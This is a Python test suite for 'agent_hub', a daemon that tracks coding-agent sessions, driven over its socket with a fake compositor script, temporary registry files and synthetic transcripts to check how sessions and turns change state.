"""Protocol tests: a real daemon on a temp runtime dir, a temp session registry and
a scripted niri, driven over its socket."""

import json
import os
import shutil
import signal
import socket
import subprocess
import sys
import tempfile
import threading
import time
import unittest
import uuid
from pathlib import Path

from agent_hub import claude, links, menus, protocol
from agent_hub.common import parent_pid

PACKAGE = Path(__file__).resolve().parent.parent
TIMEOUT = 5

FAKE_NIRI = """#!{python}
import json, os, sys
args = sys.argv[1:]
if "event-stream" in args:
    with open({sockets!r}, "a") as log:
        log.write(str(os.environ.get("NIRI_SOCKET")) + "\\n")
    with open({fifo!r}) as events:
        for line in events:
            print(line, end="", flush=True)
elif "focus-window" in args:
    with open({log!r}, "a") as log:
        log.write(args[-1] + "\\n")
elif "spawn" in args:
    with open({log!r} + ".spawn", "a") as log:
        log.write(json.dumps(args[args.index("--") + 1:]) + "\\n")
"""

class Client:
    def __init__(self, path):
        self.sock = socket.socket(socket.AF_UNIX)
        self.sock.connect(str(path))
        self.buffer = b""

    def send(self, **message):
        self.sock.sendall((json.dumps(message) + "\n").encode())

    def recv(self, timeout=TIMEOUT):
        deadline = time.monotonic() + timeout
        while b"\n" not in self.buffer:
            left = deadline - time.monotonic()
            if left <= 0:
                raise TimeoutError
            self.sock.settimeout(left)
            chunk = self.sock.recv(65536)
            if not chunk:
                raise ConnectionError("hub closed the connection")
            self.buffer += chunk
        line, self.buffer = self.buffer.split(b"\n", 1)
        return json.loads(line)

    def wait(self, predicate, timeout=TIMEOUT):
        """The first message `predicate` accepts; raises TimeoutError."""
        deadline = time.monotonic() + timeout
        while True:
            message = self.recv(max(deadline - time.monotonic(), 0.001))
            if predicate(message):
                return message

    def close(self):
        self.sock.close()


class Hub:
    """A daemon on a desktop by default; `headless` drops niri, polls the
    registry and leaves it no runtime dir, as on a server or a Mac."""

    def __init__(self, headless=False, extra=None):
        self.tmp = Path(tempfile.mkdtemp(prefix="agent-hub-test-"))
        self.registry = self.tmp / "sessions"
        self.registry.mkdir()
        fifo = self.tmp / "niri.fifo"
        os.mkfifo(fifo)
        # Read-write so neither side blocks on open, and the stream outlives a reader.
        self.niri_events = os.open(fifo, os.O_RDWR)
        self.focus_log = self.tmp / "focus.log"
        self.socket_log = self.tmp / "niri-socket.log"
        niri = self.tmp / "niri"
        niri.write_text(
            FAKE_NIRI.format(python=sys.executable, fifo=str(fifo), log=str(self.focus_log), sockets=str(self.socket_log))
        )
        niri.chmod(0o755)
        config = self.tmp / "config.json"
        desktop = {"niri": str(niri), "terminal": ["ghostty", "--working-directory={cwd}", "-e"]}
        config.write_text(json.dumps({
            "registry": str(self.registry),
            "git": shutil.which("git"),
            "state": str(self.tmp / "state.json"),
            **({"poll": True} if headless else desktop),
            **(extra or {}),
        }))
        runtime = self.tmp / "run"
        runtime.mkdir(mode=0o700)
        self.env = dict(os.environ, XDG_RUNTIME_DIR=str(runtime), XDG_STATE_HOME=str(self.tmp / "state"),
                        AGENT_HUB_CONFIG=str(config))
        if headless:
            del self.env["XDG_RUNTIME_DIR"]
            self.socket = self.tmp / "state" / "agent-hub" / "hub.sock"
        else:
            self.socket = runtime / "agent-hub" / "hub.sock"
        # Run inside a Claude session, the hooks would otherwise name that session's pid.
        for name in ("CLAUDE_CONFIG_DIR", "CLAUDE_PID"):
            self.env.pop(name, None)
        # The compositor's socket is discovered, not inherited, so keep the runner's out of it.
        self.env.pop("NIRI_SOCKET", None)
        self.processes = []
        self.clients = []
        self.start()

    def start(self):
        # Its own process group, so a restart reaps the fake niri with it: an orphan
        # would keep reading the event fifo behind the next daemon's back.
        self.daemon = subprocess.Popen([sys.executable, "-m", "agent_hub", "daemon"], env=self.env, cwd=PACKAGE, start_new_session=True)
        deadline = time.monotonic() + TIMEOUT
        while not self.socket.exists():
            if time.monotonic() > deadline or self.daemon.poll() is not None:
                raise RuntimeError("hub did not start")
            time.sleep(0.02)

    def kill(self):
        try:
            os.killpg(self.daemon.pid, signal.SIGKILL)
        except ProcessLookupError:
            pass
        self.daemon.wait()

    def restart(self):
        self.kill()
        self.socket.unlink()
        self.start()

    def connect(self):
        client = Client(self.socket)
        self.clients.append(client)
        return client

    def subscribe(self):
        client = self.connect()
        client.send(op="subscribe")
        client.wait(lambda m: m["type"] == "state")
        return client

    def command(self, *args, stdin="", **env):
        return subprocess.run([sys.executable, "-m", "agent_hub", *args], env=dict(self.env, **env), cwd=PACKAGE, input=stdin, text=True,
                              check=True, capture_output=True, timeout=TIMEOUT)

    def held_hook(self, test, session_id, tool_input, tool="Bash"):
        """A PermissionRequest hook, running and waiting on the hub as Claude's would."""
        hook = subprocess.Popen([sys.executable, "-m", "agent_hub", "hook"], env=self.env, cwd=PACKAGE, text=True,
                                stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        test.addCleanup(hook.communicate)
        test.addCleanup(hook.kill)
        hook.stdin.write(json.dumps({"hook_event_name": "PermissionRequest", "session_id": session_id, "cwd": "/repo",
                                     "tool_name": tool, "tool_input": tool_input}))
        hook.stdin.close()
        hook.stdin = None
        return hook

    def write_transcript(self, name, entries):
        path = self.tmp / f"{name}.jsonl"
        path.write_text("".join(json.dumps(e) + "\n" for e in entries))
        return path

    def process(self):
        proc = subprocess.Popen([sys.executable, "-c", "import time; time.sleep(600)"])
        self.processes.append(proc)
        return proc

    def write_session(self, pid, session_id, status="busy", kind="interactive", since=None, **fields):
        entry = {"pid": pid, "sessionId": session_id, "cwd": "/repo", "kind": kind, "entrypoint": "cli",
                 "name": "demo", "status": status, "statusUpdatedAt": since or int(time.time() * 1000), **fields}
        tmp = self.registry / f".{pid}.json.tmp"
        tmp.write_text(json.dumps(entry))
        tmp.rename(self.registry / f"{pid}.json")

    def niri(self, event):
        os.write(self.niri_events, (json.dumps(event) + "\n").encode())

    def focused(self):
        """The windows focus requests went to, in order."""
        return self.focus_log.read_text().split() if self.focus_log.exists() else []

    def stop(self):
        for client in self.clients:
            client.close()
        for proc in self.processes:
            proc.kill()
            proc.wait()
        self.kill()
        os.close(self.niri_events)


def eventually(predicate):
    deadline = time.monotonic() + TIMEOUT
    while not predicate():
        if time.monotonic() > deadline:
            raise TimeoutError
        time.sleep(0.02)


def logged(path):
    """The calls a fake tool logged, once there is at least one."""
    eventually(lambda: path.exists() and path.read_text())
    return [json.loads(line) for line in path.read_text().splitlines()]


def session(state, session_id):
    return next((s for s in state["sessions"] if s["id"] == session_id), None)


def has_session(session_id, predicate=lambda s: True):
    return lambda m: m["type"] == "state" and (s := session(m, session_id)) is not None and predicate(s)


def lacks_session(session_id):
    return lambda m: m["type"] == "state" and session(m, session_id) is None


class Pi:
    """A pi session attached to the hub. Its turns go to a session file the way pi writes
    them, which is what the hub reads when pi leaves out its closing words."""

    def __init__(self, hub, sid, pid, cwd="/repo", **attach):
        self.client = hub.connect()
        self.pushed, self.replies, self.refused = [], {}, []
        self.requests = 0
        self.file = hub.tmp / f"pi-{sid}.jsonl"
        self.entries = [{"type": "session", "version": 3, "id": sid, "cwd": cwd}]
        self.changed = threading.Condition()
        threading.Thread(target=self._read, daemon=True).start()
        message = {"version": protocol.VERSION, "session": sid, "pid": pid, "cwd": cwd, "status": "idle",
                   "since": int(time.time() * 1000), "waitingFor": None, "name": None,
                   "transcript": str(self.file), "leaf": None, **attach}
        self.client.send(op="attach", **message)

    def _read(self):
        while True:
            try:
                message = self.client.recv(timeout=600)
            except (OSError, ConnectionError, TimeoutError, ValueError):
                return
            with self.changed:
                kind = message.get("type")
                if kind == "row":
                    self.pushed.append(message)
                elif kind == "reply":
                    self.replies[message["request"]] = message
                elif kind == "refused":
                    self.refused.append(message["text"])
                self.changed.notify_all()

    def wait(self, predicate):
        with self.changed:
            if not self.changed.wait_for(predicate, TIMEOUT):
                raise TimeoutError

    def row(self, predicate=lambda push: True):
        """The latest row pushed that `predicate` takes; waits for one."""
        self.wait(lambda: any(p["row"] and predicate(p) for p in self.pushed))
        return [p for p in self.pushed if p["row"] and predicate(p)][-1]

    def _append(self, message):
        parent = self.entries[-1].get("id") if len(self.entries) > 1 else None
        self.entries.append({"type": "message", "id": f"e{len(self.entries)}", "parentId": parent, "message": message})
        self.file.write_text("".join(json.dumps(e) + "\n" for e in self.entries))

    def start(self, prompt="fix the retry test", from_person=True, worktree_tool=False):
        """Starts a turn and returns the peers note the hub replied with."""
        self._append({"role": "user", "content": [{"type": "text", "text": prompt}]})
        self.requests += 1
        request = self.requests
        self.client.send(op="turn-start", request=request, prompt=prompt, fromPerson=from_person,
                         worktreeTool=worktree_tool, transcript=str(self.file))
        self.wait(lambda: request in self.replies)
        return self.replies[request]["peers"]

    def end(self, said="Done.", pending=0, error=False, tell=True):
        """Ends the turn on `said`, which pi sends along unless `tell` is false."""
        self._append({"role": "assistant", "content": [{"type": "text", "text": said}]})
        self.client.send(op="turn-end", pending=pending, error=error, transcript=str(self.file), **({"said": said} if tell else {}))

    def close(self):
        """Hangs up as pi does when its session ends; a shutdown, since the reader thread holds the socket."""
        self.client.sock.shutdown(socket.SHUT_RDWR)


class HubTest(unittest.TestCase):
    def setUp(self):
        self.hub = Hub()
        self.addCleanup(self.hub.stop)
        self.sid = str(uuid.uuid4())


class SessionTest(HubTest):
    def test_a_headless_run_never_shows_though_it_registers_as_interactive(self):
        bar = self.hub.subscribe()
        headless, proc = str(uuid.uuid4()), self.hub.process()
        self.hub.write_session(self.hub.process().pid, headless, entrypoint="sdk-cli")
        self.hub.write_session(proc.pid, self.sid)
        state = bar.wait(has_session(self.sid))
        self.assertNotIn(headless, [row["id"] for row in state["sessions"]])

    def test_interactive_session_appears_and_drops_when_its_process_exits(self):
        bar = self.hub.subscribe()
        proc = self.hub.process()
        self.hub.write_session(proc.pid, self.sid, status="busy")
        bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        proc.kill()
        proc.wait()
        bar.wait(lacks_session(self.sid))

    def test_headless_sessions_are_not_shown(self):
        bar = self.hub.subscribe()
        headless, shown = self.hub.process(), self.hub.process()
        self.hub.write_session(headless.pid, "headless", kind="headless")
        self.hub.write_session(shown.pid, self.sid)
        state = bar.wait(has_session(self.sid))
        self.assertIsNone(session(state, "headless"))

    def test_parked_session_shows_its_bg_jobs_state_under_the_fronts_window(self):
        front, job = self.hub.process(), self.hub.process()
        self.hub.niri({"WindowsChanged": {"windows": [{"id": 7, "pid": front.pid, "is_focused": False}]}})
        bar = self.hub.subscribe()
        self.hub.write_session(job.pid, self.sid, status="busy", kind="bg", jobId="job1", name="live")
        self.hub.write_session(front.pid, "front", status="idle", parkedJobId="job1")
        state = bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["window"] == 7))
        self.assertEqual(session(state, self.sid)["name"], "live")
        self.assertIsNone(session(state, "front"))
        job.kill()
        job.wait()
        bar.wait(has_session("front", lambda s: s["state"] == "idle"))

    def test_unparked_bg_jobs_are_not_shown(self):
        bar = self.hub.subscribe()
        job, shown = self.hub.process(), self.hub.process()
        self.hub.write_session(job.pid, "job", kind="bg", jobId="job1")
        self.hub.write_session(shown.pid, self.sid)
        state = bar.wait(has_session(self.sid))
        self.assertIsNone(session(state, "job"))

    def test_entry_of_a_dead_process_is_ignored(self):
        bar = self.hub.subscribe()
        proc = self.hub.process()
        proc.kill()
        proc.wait()
        self.hub.write_session(proc.pid, "dead")
        live = self.hub.process()
        self.hub.write_session(live.pid, self.sid)
        state = bar.wait(has_session(self.sid))
        self.assertIsNone(session(state, "dead"))


class HeadlessTest(unittest.TestCase):
    """A hub with no compositor and no runtime dir: the one on a server or a Mac."""

    def setUp(self):
        self.hub = Hub(headless=True)
        self.addCleanup(self.hub.stop)

    def test_polled_session_appears_without_a_window_and_drops_when_its_process_exits(self):
        bar = self.hub.subscribe()
        proc = self.hub.process()
        self.hub.write_session(proc.pid, "s1", status="busy")
        state = bar.wait(has_session("s1", lambda s: s["state"] == "working"))
        self.assertIsNone(session(state, "s1")["window"])
        proc.kill()
        proc.wait()
        bar.wait(lacks_session("s1"))

    def test_status_finds_the_hub_in_the_state_dir(self):
        proc = self.hub.process()
        self.hub.write_session(proc.pid, "s1", status="busy")
        bar = self.hub.subscribe()
        bar.wait(has_session("s1"))
        self.assertEqual(self.hub.command("status", "--session-id", "s1").stdout, "working\t\tdemo\n")


class TurnTest(HubTest):
    """How a pi turn ends, by pi's own word, and what looking at it does."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.window = 7
        self.hub.niri({"WindowsChanged": {"windows": [
            {"id": self.window, "pid": self.proc.pid, "is_focused": False},
            {"id": 8, "pid": 1, "is_focused": True},
        ]}})
        self.bar = self.hub.subscribe()
        self.pi = Pi(self.hub, self.sid, self.proc.pid)
        self.bar.wait(has_session(self.sid, lambda s: s["window"] == self.window))
        self.pi.start()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.canaries = 0

    def finish(self, said="Done.", **end):
        """Ends the turn on `said`, and returns its row once it is done."""
        self.pi.end(said, **end)
        return session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done")), self.sid)

    def fail(self):
        self.pi.end(error=True)
        return session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed")), self.sid)

    def focused_row(self, window):
        """This session's row, read off a canary write that makes the hub publish."""
        self.hub.niri({"WindowFocusChanged": {"id": window}})
        self.canaries += 1
        canary = self.hub.process()
        self.hub.write_session(canary.pid, "canary", status="busy", name=f"canary {self.canaries}")
        return session(self.bar.wait(has_session("canary")), self.sid)

    def test_a_pi_turn_ends_done_with_its_closing_words(self):
        row = self.finish("Kept the old fixture. It still passes.\n\nShall I drop the new one?")
        self.assertEqual((row["reason"], row["said"]), ("Kept the old fixture.", "Kept the old fixture. It still passes.\n\nShall I drop the new one?"))
        self.assertNotIn("ask", row)

    def test_a_pi_turn_that_leaves_out_its_words_is_read_off_its_session_file(self):
        row = self.finish("Rebased onto main.", tell=False)
        self.assertEqual(row["said"], "Rebased onto main.")

    def test_a_turn_that_ended_on_an_error_failed(self):
        self.fail()

    def test_a_turn_waiting_on_its_jobs_stays_working(self):
        self.pi.end(pending=1, said="The build runs; I'll be notified when it finishes.")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "waiting on 1 background job"))

    def test_a_job_the_closing_words_dont_wait_on_is_done(self):
        self.finish("The preview server is up.", pending=1)

    def test_a_finished_turn_whose_window_has_focus_is_read_and_the_next_one_announces(self):
        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
        self.pi.end()
        # Looking at it reads the ending, so the row goes idle without a dismissal.
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.pi.start()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))

    def test_a_finished_turn_under_another_window_stays_until_it_is_read(self):
        self.finish()
        self.hub.niri({"WindowFocusChanged": {"id": 8}})
        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))

    def test_dismissed_turn_is_idle_until_the_next_one_finishes(self):
        self.finish()
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.pi.start()
        self.finish()

    def test_a_failed_turn_still_wants_you_when_its_window_is_focused(self):
        self.fail()
        self.assertEqual(self.focused_row(self.window)["state"], "failed")

    def test_toggle_dismisses_and_brings_back_the_focused_sessions_turn(self):
        self.fail()
        self.focused_row(self.window)
        self.bar.send(op="toggle")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.bar.send(op="toggle")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed"))

    def test_toggle_brings_back_a_done_turn_that_focus_read(self):
        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
        self.pi.end()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.bar.send(op="toggle")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.assertEqual(self.focused_row(self.window)["state"], "done")

    def test_each_ending_goes_to_the_rows_history_and_the_work_log(self):
        self.finish("Regenerated the fixture.\n\nKeep the old one?")
        self.pi.start()
        row = self.finish("Kept the old fixture.")
        self.assertEqual([(h["state"], h["did"]) for h in row["history"]],
                         [("done", "Regenerated the fixture."), ("done", "Kept the old fixture.")])
        out = self.hub.command("log", "--since", "1h").stdout.splitlines()
        self.assertEqual(out[0], f"repo\tcd /repo && pi --session {self.sid[:8]}")
        self.assertRegex(out[1], r"done +Regenerated the fixture\.$")
        self.assertRegex(out[2], r"done +Kept the old fixture\.$")
        self.assertEqual(self.hub.command("find", "old", "FIXTURE").stdout.splitlines(), out)
        self.assertEqual(self.hub.command("find", "darwin").stdout, "")
        line = logged(self.hub.tmp / "log.jsonl")[-1]
        self.assertEqual((line["name"], line["turn"]), ("repo", 2))

    def test_undo_brings_back_the_last_dismissal_without_a_pulse(self):
        self.fail()
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.bar.send(op="undo")
        row = session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed")), self.sid)
        self.assertFalse(row["pulse"])

    def test_undo_brings_back_a_prompt_that_had_hidden_a_finished_turn(self):
        self.finish()
        self.hub.connect().send(op="dialog", session=self.sid, text="Bash: rm -rf build")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking"))
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.bar.send(op="undo")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "asking"))

    def test_undo_drops_a_dismissal_once_the_session_started_a_new_turn(self):
        self.finish()
        self.bar.send(op="dismiss", session=self.sid)
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.pi.start()
        self.finish()
        self.hub.niri({"WindowFocusChanged": {"id": self.window}})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        self.bar.send(op="undo")
        self.bar.send(op="subscribe")
        self.assertEqual(session(self.bar.wait(lambda m: m["type"] == "state"), self.sid)["state"], "idle")

    def test_focus_goes_to_the_sessions_window(self):
        self.bar.send(op="focus", session=self.sid)
        eventually(lambda: self.hub.focused() == [str(self.window)])


def prompt(text):
    return {"type": "user", "message": {"role": "user", "content": text}}


def said(text):
    return {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "text", "text": text}]}}


def ran():
    """A tool call and its result."""
    result = {"type": "user", "message": {"role": "user", "content": [{"type": "tool_result", "tool_use_id": "t1"}]},
              "toolUseResult": {"stdout": ""}}
    use = {"type": "assistant", "message": {"role": "assistant", "content": [{"type": "tool_use", "id": "t1", "name": "Bash"}]}}
    return [use, result]


class ClaudeTurnTest(HubTest):
    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.hub.write_session(self.proc.pid, self.sid, status="idle")
        # A session whose writes make the hub publish, for reading its own row when it does not.
        self.canary = self.hub.process()
        self.canaries = 0

    def settled(self):
        """This session's row, read off a canary write the hub may well ignore."""
        self.canaries += 1
        self.hub.write_session(self.canary.pid, "canary", status="busy", name=f"canary {self.canaries}")
        # A rescan reads every entry, so this message also carries whatever changed in `sid`'s.
        return session(self.bar.wait(has_session("canary")), self.sid)

    def stop(self, entries, session_id=None, name="Stop", tasks=(), payload=None, **env):
        transcript = self.hub.write_transcript(self.sid, entries)
        event = {"hook_event_name": name, "session_id": session_id or self.sid, "transcript_path": str(transcript),
                 "background_tasks": list(tasks), **(payload or {})}
        self.hub.command("hook", stdin=json.dumps(event), **env)

    def test_a_turn_that_ends_on_a_question_is_done_with_its_words(self):
        self.stop([prompt("rebase it"), said("Rebased onto main.\n\nWant me to push?")])
        state = self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        row = session(state, self.sid)
        self.assertEqual((row["summary"], row["said"]), ("Rebased onto main.", "Rebased onto main.\n\nWant me to push?"))

    def test_turn_is_the_registered_sessions_after_a_clear_left_the_hook_an_old_id(self):
        self.stop([prompt("rebase it"), said("Want me to push?")], session_id="before-clear", CLAUDE_PID=str(self.proc.pid))
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))

    def test_agent_work_in_flight_is_working_until_it_reports(self):
        job = [prompt("build it"), *ran(), said("The review runs in the background.")]
        self.stop(job, tasks=[{"type": "subagent", "status": "running", "description": "Review the hub"}])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "Review the hub"))
        self.stop([*job, said("Reviewed.")])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))

    def test_agent_work_in_flight_keeps_it_working_even_after_a_question(self):
        self.stop([prompt("build it"), said("Want me to push meanwhile?")], tasks=[{"type": "workflow", "description": "Review"}])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "Review"))

    def test_a_shell_task_its_closing_words_wait_on_keeps_it_working(self):
        self.stop([prompt("build it"), *ran(), said("The build runs; I'll be notified when it finishes.")],
                  tasks=[{"type": "shell", "description": "nix build"}])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working" and s["doing"] == "nix build"))

    def test_a_shell_task_is_done_unless_its_closing_words_say_it_waits(self):
        self.stop([prompt("show me the site"), *ran(), said("The preview is up at http://localhost:4321.")],
                  tasks=[{"type": "shell", "description": "preview"}])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))

    def test_the_closing_words_of_the_stop_beat_a_transcript_that_lags(self):
        self.stop([prompt("rebase it"), *ran()], payload={"last_assistant_message": "Rebased.\n\nWant me to push?"})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["said"] == "Rebased.\n\nWant me to push?"))

    def test_a_turn_that_died_on_an_api_error_failed_with_it_as_the_reason(self):
        self.stop([prompt("rebase it")], name="StopFailure", payload={"error": "rate_limit", "last_assistant_message": "API Error: Rate limit reached"})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and s["reason"] == "API Error: Rate limit reached"))

    def test_a_running_turn_shows_what_its_transcript_says(self):
        entries = [prompt("build it"), said("Building it now."),
                   {"type": "assistant", "timestamp": "2026-11-03T00:00:00.000Z", "message": {"role": "assistant", "content": [
                       {"type": "tool_use", "id": "t", "name": "Bash", "input": {"command": "just build"}}]}}]
        # The registry's `idle` from setUp must have landed, or it would end this turn as interrupted.
        self.settled()
        event = {"hook_event_name": "UserPromptSubmit", "session_id": self.sid, "prompt": "build it",
                 "transcript_path": str(self.hub.write_transcript(self.sid, entries))}
        self.hub.command("hook", stdin=json.dumps(event))
        state = self.bar.wait(has_session(self.sid, lambda s: s.get("now") == "just build"))
        row = session(state, self.sid)
        self.assertEqual((row["doing"], row["reason"]), ("Building it now.", "Building it now."))
        self.assertEqual(row["counts"]["commands"], 1)
        self.assertEqual(row["trail"][-1]["text"], "Building it now.")
        # Its narration is the agent's words: it stays off the state file.
        self.hub.write_session(self.proc.pid, self.sid, status="busy", name="still going")
        self.settled()
        self.assertNotIn("Building it now", (self.hub.tmp / "state.json").read_text())
        # And it is over with the turn.
        self.stop(entries, payload={"last_assistant_message": "Done."})
        state = self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.assertNotIn("now", session(state, self.sid))

    def peer_turn(self, closing, name="Stop"):
        """A peer's message wakes the session, as Claude reports it, and its turn ends on `closing`."""
        entries = [prompt("<cross-session-message from=\"uds:/x\" from-name=\"other\">\nhi\n</cross-session-message>")]
        event = {"hook_event_name": "UserPromptSubmit", "session_id": self.sid, "prompt": entries[0]["message"]["content"],
                 "transcript_path": str(self.hub.write_transcript(self.sid, entries))}
        self.hub.command("hook", stdin=json.dumps(event))
        self.stop([*entries, said(closing)], name=name, payload={"last_assistant_message": closing})

    def test_a_peers_message_leaves_your_finished_turn_and_your_prompt(self):
        self.stop([prompt("rebase it"), said("Want me to push?")])
        before = session(self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done")), self.sid)
        self.peer_turn("No action needed from me.")
        log = self.hub.tmp / "log.jsonl"
        eventually(lambda: any(line.get("peer") for line in logged(log)))
        after = self.settled()
        self.assertEqual((after["state"], after["said"], after["since"]), ("done", "Want me to push?", before["since"]))
        self.assertNotIn("prompt", after)

    def test_a_peers_turn_is_in_the_log_as_one(self):
        self.stop([prompt("rebase it"), said("Rebased.")])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.peer_turn("Replied to the other session.")
        log = self.hub.tmp / "log.jsonl"
        eventually(lambda: any(line.get("peer") for line in logged(log)))
        line = next(line for line in logged(log) if line.get("peer"))
        self.assertEqual((line["state"], line["did"]), ("done", "Replied to the other session."))
        self.assertEqual(self.settled()["summary"], "Rebased.")

    def test_a_peers_turn_that_failed_shows_as_a_turn_of_its_own(self):
        self.stop([prompt("rebase it"), said("Rebased.")], payload={"last_assistant_message": "Rebased."})
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.peer_turn("API Error: overloaded", name="StopFailure")
        state = self.bar.wait(has_session(self.sid, lambda s: s["state"] == "failed" and s["reason"] == "API Error: overloaded"))
        line = next(line for line in logged(self.hub.tmp / "log.jsonl") if line.get("peer"))
        self.assertEqual((line["state"], line["turn"]), ("failed", session(state, self.sid)["turn"]))

    def test_a_prompt_that_only_quotes_the_tag_is_yours(self):
        text = "x" * 300 + ' <cross-session-message from="a">'
        event = {"hook_event_name": "UserPromptSubmit", "session_id": self.sid, "prompt": text,
                 "transcript_path": str(self.hub.write_transcript(self.sid, [prompt(text)]))}
        self.hub.command("hook", stdin=json.dumps(event))
        self.bar.wait(has_session(self.sid, lambda s: s.get("prompt", "").startswith("xxx")))

    def test_a_turn_only_the_registry_heard_of_starts_after_its_grace(self):
        self.stop([prompt("rebase it"), said("Want me to push?")])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        self.assertEqual(self.settled()["state"], "done")
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))

    def running(self):
        """A session mid-turn, as a fresh subscriber sees it: the shared bar may have heard already."""
        self.hub.write_session(self.proc.pid, self.sid, status="busy")
        bar = self.hub.connect()
        bar.send(op="subscribe")
        bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))

    def test_a_turn_whose_stop_a_restart_missed_is_read_from_its_transcript(self):
        self.running()
        state_file = self.hub.tmp / "state.json"
        eventually(lambda: state_file.exists() and '"ended": null' in state_file.read_text())
        self.hub.kill()
        self.hub.write_session(self.proc.pid, self.sid, status="idle")
        self.hub.write_transcript(self.sid, [prompt("rebase it"), said("Want me to push?")])
        saved = json.loads(state_file.read_text())
        saved["sessions"][0]["transcript"] = str(self.hub.tmp / f"{self.sid}.jsonl")
        state_file.write_text(json.dumps(saved))
        self.hub.socket.unlink()
        self.hub.start()
        bar = self.hub.connect()
        bar.send(op="subscribe")
        bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["said"] == "Want me to push?"))

    def test_a_turn_still_running_across_a_restart_stays_working_until_its_stop(self):
        self.running()
        self.hub.restart()
        bar = self.hub.connect()
        bar.send(op="subscribe")
        bar.wait(has_session(self.sid, lambda s: s["state"] == "working"))
        self.stop([prompt("go"), said("Done.")])
        bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))

    def test_finished_turn_survives_a_restart(self):
        self.stop([prompt("rebase it"), said("Want me to push?")])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.hub.restart()
        bar = self.hub.connect()
        bar.send(op="subscribe")
        bar.wait(has_session(self.sid, lambda s: s["state"] == "done" and s["said"] == "Want me to push?"))

    def test_dialog_that_only_shows_something_leaves_the_turn_alone(self):
        self.stop([prompt("fix the build"), said("The build fails on darwin still.")])
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        self.bar.send(op="dismiss", session=self.sid)
        state = self.bar.wait(has_session(self.sid, lambda s: s["state"] == "idle"))
        since = session(state, self.sid)["since"]
        # Claude marks the history view `waiting` too, then stamps its close; neither is this turn's.
        self.hub.write_session(self.proc.pid, self.sid, status="waiting", waitingFor="dialog open", since=since + 5_000)
        self.assertEqual(self.settled()["state"], "idle")
        self.hub.write_session(self.proc.pid, self.sid, status="idle", since=since + 9_000)
        # The modal's stamps must not bring the dismissed turn back, then or on a later read.
        for _ in range(2):
            row = self.settled()
            self.assertEqual((row["state"], row["since"]), ("idle", since))


class PiTest(HubTest):
    """An attached pi session: its own status and name."""

    def setUp(self):
        super().setUp()
        self.proc = self.hub.process()
        self.bar = self.hub.subscribe()

    def attach(self, **attach):
        return Pi(self.hub, self.sid, self.proc.pid, **attach)

    def finished(self, **attach):
        """A pi session that finished a turn and hung up; waits for it to be on the recent list."""
        pi = self.attach(**attach)
        pi.start()
        pi.end()
        self.bar.wait(has_session(self.sid, lambda s: s["state"] == "done"))
        pi.close()
        return self.bar.wait(lambda m: m["type"] == "state" and m["recent"])

    def test_attached_session_shows_without_a_registry_entry_and_drops_when_it_hangs_up(self):
        pi = self.attach()
        self.bar.wait(has_session(self.sid))
        pi.close()
        self.bar.wait(lacks_session(self.sid))

    def test_the_persons_own_name_names_it_and_else_its_folder(self):
        pi = self.attach(name="my name")
        self.bar.wait(has_session(self.sid, lambda s: s["name"] == "my name"))
        pi.client.send(op="named", name=None)
        state = self.bar.wait(has_session(self.sid, lambda s: s["name"] == "repo"))
        self.assertNotIn("label", session(state, self.sid))

    def test_its_own_row_is_pushed_to_it(self):
        pi = self.attach()
        pi.start()
        push = pi.row(lambda p: p["row"]["state"] == "working")
        self.assertEqual(set(push), {"type", "row"})

